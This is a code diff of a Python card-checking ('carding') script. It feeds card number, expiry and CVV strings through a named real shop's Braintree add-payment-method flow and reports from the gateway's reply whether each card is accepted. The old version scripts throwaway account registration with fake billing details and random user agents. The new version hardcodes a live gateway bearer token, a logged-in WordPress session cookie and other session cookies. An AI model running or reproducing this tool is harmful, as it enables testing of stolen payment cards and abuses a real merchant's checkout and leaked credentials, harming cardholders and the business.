@@ -1,65 +1,137 @@
-import os,sys
-import random
-import telebot
-import requests,random,time,string,base64
-from user_agent import generate_user_agent
-from colorama import Fore
-from bs4 import BeautifulSoup
-import os,json
-import base64
-from telebot import types
-import time,requests
-from re import findall
-import user_agent
-
-import re
-
 import requests
-import re,json
-import random
-import time
-import string
-import base64
-from bs4 import BeautifulSoup
-
-
-
-import random
-import string
-import threading
-import time
-		
-		
+import re
+#https://bellamodastudio.com/my-account/add-payment-method/
 def Tele(ccx):
-	ccx,n,mm,yy,cvc,email,user,username = ccx.strip(),ccx.split("|")[0],ccx.split("|")[1],ccx.split("|")[2],ccx.split("|")[3],"".join(random.choice('qwertyuiopasdfghjklzxcvbnm') for b in range(7))+'@gmail.com', generate_user_agent(),''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
-	r=requests.session()
-	headers={'User-Agent': user,}
-	rrr=r.get("https://bellamodastudio.com/my-account/add-payment-method/",headers=headers)
-	login=findall(r'name="woocommerce-register-nonce" value="(.*?)"',rrr.text)[0]
-	headers={'User-Agent': user,}
-	data = {'username': username,'email': email,'wc_order_attribution_source_type': 'typein','wc_order_attribution_referrer': '(none)','wc_order_attribution_utm_campaign': '(none)','wc_order_attribution_utm_source': '(direct)','wc_order_attribution_utm_medium': '(none)','wc_order_attribution_utm_content': '(none)','wc_order_attribution_utm_id': '(none)','wc_order_attribution_utm_term': '(none)','wc_order_attribution_utm_source_platform': '(none)','wc_order_attribution_utm_creative_format': '(none)','wc_order_attribution_utm_marketing_tactic': '(none)','wc_order_attribution_session_entry': 'https://bellamodastudio.com/my-account/add-payment-method/','wc_order_attribution_session_start_time': '2024-10-25 18:40:42','wc_order_attribution_session_pages': '1','wc_order_attribution_session_count': '1','wc_order_attribution_user_agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36','woocommerce-register-nonce': login,'_wp_http_referer': '/my-account/add-payment-method/','register': 'Register',}
-	response = r.post('https://bellamodastudio.com/my-account/add-payment-method/', headers=headers, data=data)
-	headers={'User-Agent': user,}
-	res = r.get('https://bellamodastudio.com/my-account/edit-address/billing/', cookies=r.cookies, headers=headers)
-	add = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', res.text).group(1)
-	headers={'User-Agent': user,}
-	data = {'billing_first_name': 'Tome','billing_last_name': 'Hunty','billing_company': '','billing_country': 'US','billing_address_1': '56 High St','billing_address_2': '','billing_city': 'Mold','billing_state': 'NY','billing_postcode': '10090','billing_phone': '1 253-290-6967','billing_email': email,'billing_how_found_us': 'YouTube ','billing_agree_to_terms': 'I have read & agree to shipping & guarantee terms','save_address': 'Save address','woocommerce-edit-address-nonce': add,'_wp_http_referer': '/my-account/edit-address/billing/','action': 'edit_address',}
-	response = r.post(
-	    'https://bellamodastudio.com/my-account/edit-address/billing/',
-	    headers=headers,
-	    data=data,
-	)
-	headers={'User-Agent': user,}
-	rrr=r.get("https://bellamodastudio.com/my-account/add-payment-method/",headers=headers)
-	nonce,aut=findall(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"',rrr.text)[0],rrr.text.split(r'var wc_braintree_client_token')[1].split('"')[1]
-	base4=str(base64.b64decode(aut))
-	auth= base4.split('"authorizationFingerprint":')[1].split('"')[1]
-	headers = {'authority': 'payments.braintree-api.com','accept': '*/*','accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7','authorization': f'Bearer {auth}','braintree-version': '2018-05-10','content-type': 'application/json','origin': 'https://assets.braintreegateway.com','referer': 'https://assets.braintreegateway.com/','sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'cross-site','user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',}
-	json_data = {'clientSdkMetadata': {'source': 'client','integration': 'custom','sessionId': None,},'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }','variables': {'input': {'creditCard': {'number': n,'expirationMonth': mm,'expirationYear': yy,'cvv': cvc,'billingAddress': {'postalCode': '10080','streetAddress': '56 High St',},},'options': {'validate': False,},},},'operationName': 'TokenizeCreditCard',}
-	tok = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data).json()['data']['tokenizeCreditCard']['token']
-	headers={'User-Agent': user,}
-	data = {'payment_method': 'braintree_cc','braintree_cc_nonce_key': tok,'braintree_cc_device_data': '{"device_session_id":"cc9ad686107880b70b3e3c47542e5e52","fraud_merchant_id":null,"correlation_id":"1c8ad1c8-f004-4e96-98af-8dfa6083"}','braintree_cc_3ds_nonce_key': '','braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/hj23fv5n4phszjjj/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/hj23fv5n4phszjjj"},"merchantId":"hj23fv5n4phszjjj","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"kount":{"kountMerchantId":null},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["MasterCard","Visa","Discover","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"paypalEnabled":true,"paypal":{"displayName":"Bella Moda Studio Inc.","clientId":"AVklEQ78Ty3IJVoOyejQlxzmKNuqUPuhM14F9V84RnPUfXtlzS8ry8HYBF3-OsPR7gXreDX0TMqyp3BM","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"infobellamodastudiocom","payeeEmail":null,"currencyIsoCode":"USD"}}','woocommerce-add-payment-method-nonce': nonce,'_wp_http_referer': '/my-account/add-payment-method/','woocommerce_add_payment_method': '1'}
-	response = r.post('https://bellamodastudio.com/my-account/add-payment-method/', headers=headers, data=data)
+	import requests
+	ccx=ccx.strip()
+	n = ccx.split("|")[0]
+	mm = ccx.split("|")[1]
+	yy = ccx.split("|")[2]
+	cvc = ccx.split("|")[3]
+	if "20" in yy:#Mo3gza
+		yy = yy.split("20")[1]
+	r = requests.session()	
+	
+	import requests
+
+	headers = {
+    'authority': 'payments.braintree-api.com',
+    'accept': '*/*',
+    'accept-language': 'tr-TR,tr;q=0.9',
+    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NDM5MDYyMjgsImp0aSI6IjAxNzM4N2RlLWFlYzItNDgxYy1iZTFmLWIwODk2NjAzNDJiMCIsInN1YiI6ImhqMjNmdjVuNHBoc3pqamoiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImhqMjNmdjVuNHBoc3pqamoiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0IiwiQnJhaW50cmVlOkFYTyJdLCJvcHRpb25zIjp7Im1lcmNoYW50X2FjY291bnRfaWQiOiJpbmZvYmVsbGFtb2Rhc3R1ZGlvY29tIn19.3Pzpg7xtCjqLEnZCKwtS3B7rPRCV1XHGpqdrhTGz8BMZ7g4R__-3Nn33vf4RwpoENtY7hNqFGahFTLPw29NHEg',
+    'braintree-version': '2018-05-10',
+    'content-type': 'application/json',
+    'origin': 'https://assets.braintreegateway.com',
+    'referer': 'https://assets.braintreegateway.com/',
+    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'cross-site',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
+}
+
+	json_data = {
+    'clientSdkMetadata': {
+        'source': 'client',
+        'integration': 'custom',
+        'sessionId': 'd249fb34-7064-4623-9e8b-85416697b46c',
+    },
+    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
+    'variables': {
+        'input': {
+            'creditCard': {
+                'number': n,
+                'expirationMonth': mm,
+                'expirationYear': yy,
+                'cvv': cvc,
+                'billingAddress': {
+                    'postalCode': '10080',
+                    'streetAddress': 'New York New street',
+                },
+            },
+            'options': {
+                'validate': False,
+            },
+        },
+    },
+    'operationName': 'TokenizeCreditCard',
+}
+
+	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
+
+	tok = (response.json()['data']['tokenizeCreditCard']['token'])
+
+	import requests
+
+	cookies = {
+    '_fbp': 'fb.1.1743204325388.9969175471',
+    '_ju_dn': '1',
+    '_ju_dc': '246dc807-0c2c-11f0-8e96-8f1f921179fd',
+    'wordpress_logged_in_0e7b300954825c233dfd86fbf093aa39': 'feroooz%7C1744414124%7ClIqYq2NGCxQFX4PEmgKUg5ZHar8d64hNzwhRYDuqdL0%7Cb40ddf0f5f1081d411ab318550eecfe09f6a511c6de472a4bc4be70077ddf81a',
+    'PHPSESSID': '31ede7ba51e527ed726e13e91db8c480',
+    '_gid': 'GA1.2.478321116.1743819617',
+    '_ju_v': '4.1_6.14',
+    '_ju_dm': 'cookie',
+    'sbjs_migrations': '1418474375998%3D1',
+    'sbjs_current_add': 'fd%3D2025-04-05%2002%3A20%3A22%7C%7C%7Cep%3Dhttps%3A%2F%2Fbellamodastudio.com%2F%7C%7C%7Crf%3D%28none%29',
+    'sbjs_first_add': 'fd%3D2025-04-05%2002%3A20%3A22%7C%7C%7Cep%3Dhttps%3A%2F%2Fbellamodastudio.com%2F%7C%7C%7Crf%3D%28none%29',
+    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F132.0.0.0%20Mobile%20Safari%2F537.36',
+    'yotpo_pixel': 'c038abc8-441e-41d2-8b70-98a42baa3615',
+    '_sp_ses.d52e': '*',
+    'pys_session_limit': 'true',
+    'pys_start_session': 'true',
+    'pys_first_visit': 'true',
+    'pysTrafficSource': 'direct',
+    'pys_landing_page': 'https://bellamodastudio.com/',
+    'last_pysTrafficSource': 'direct',
+    'last_pys_landing_page': 'https://bellamodastudio.com/',
+    '_ga_FNQYC8E6RL': 'GS1.1.1743819617.2.1.1743819829.0.0.0',
+    'sbjs_session': 'pgs%3D12%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fbellamodastudio.com%2Fmy-account%2Fadd-payment-method%2F',
+    '_ga': 'GA1.2.152643168.1743204325',
+    '__kla_id': 'eyJjaWQiOiJNbVl4TVRWa01HWXRPVE14TmkwME5HWTJMVGhoTVRVdE5qSTJNVFUxWVRsbU9HVm0iLCIkZXhjaGFuZ2VfaWQiOiItNVAwRTNFRkV6dE5qU055Sl9ZOWxJMVJpV2dMWk5aTEh2UDA5Y2ZZZUtzLk1tY3hnRCJ9',
+    '_ju_pn': '12',
+    'TawkConnectionTime': '0',
+    'twk_uuid_5a64fb3b4b401e45400c4474': '%7B%22uuid%22%3A%221.2U6TUtetGmYhJyFc9zI04DVa5exrRIKtoJ929RaOYRfcbvENUKVC52gKoowccpCVKyG4tIoGkHNqRreDWtGDiSgDdQdNj497KXBIRKCkAkL3sFiMEHz2lY9A74FgMuh%22%2C%22version%22%3A3%2C%22domain%22%3A%22bellamodastudio.com%22%2C%22ts%22%3A1743819835921%7D',
+    '_sp_id.d52e': '884bcde210a49796.1743204325.4.1743819849.1743209990',
+}
+
+	headers = {
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'Accept-Language': 'tr-TR,tr;q=0.9',
+    'Cache-Control': 'max-age=0',
+    'Connection': 'keep-alive',
+    'Content-Type': 'application/x-www-form-urlencoded',
+    'Origin': 'https://bellamodastudio.com',
+    'Referer': 'https://bellamodastudio.com/my-account/add-payment-method/',
+    'Sec-Fetch-Dest': 'document',
+    'Sec-Fetch-Mode': 'navigate',
+    'Sec-Fetch-Site': 'same-origin',
+    'Sec-Fetch-User': '?1',
+    'Upgrade-Insecure-Requests': '1',
+    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
+    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+}
+
+	data = {
+    'payment_method': 'braintree_cc',
+    'braintree_cc_nonce_key': tok,
+    'braintree_cc_device_data': '{"device_session_id":"e281895e9554cd22a4e1941ba0f749aa","fraud_merchant_id":null,"correlation_id":"d249fb34-7064-4623-9e8b-85416697"}',
+    'braintree_cc_3ds_nonce_key': '',
+    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/hj23fv5n4phszjjj/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/hj23fv5n4phszjjj"},"merchantId":"hj23fv5n4phszjjj","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"fastlane":{"enabled":true},"kount":{"kountMerchantId":null},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["Discover","MasterCard","Visa","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"paypalEnabled":true,"paypal":{"displayName":"Bella Moda Studio Inc.","clientId":"AVklEQ78Ty3IJVoOyejQlxzmKNuqUPuhM14F9V84RnPUfXtlzS8ry8HYBF3-OsPR7gXreDX0TMqyp3BM","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"infobellamodastudiocom","payeeEmail":null,"currencyIsoCode":"USD"}}',
+    'woocommerce-add-payment-method-nonce': 'e249c25c07',
+    '_wp_http_referer': '/my-account/add-payment-method/',
+    'woocommerce_add_payment_method': '1',
+}
+
+	response = requests.post('https://bellamodastudio.com/my-account/add-payment-method/', cookies=cookies, headers=headers, data=data)
+
+	import re	
 	text = response.text
 	pattern = r'Reason: (.+?)\s*</li>'
 	match = re.search(pattern, text)
@@ -90,5 +162,3 @@ def Tele(ccx):
 			return "try again"
 		else:
 			return 'Unknow Response'
-	
-		
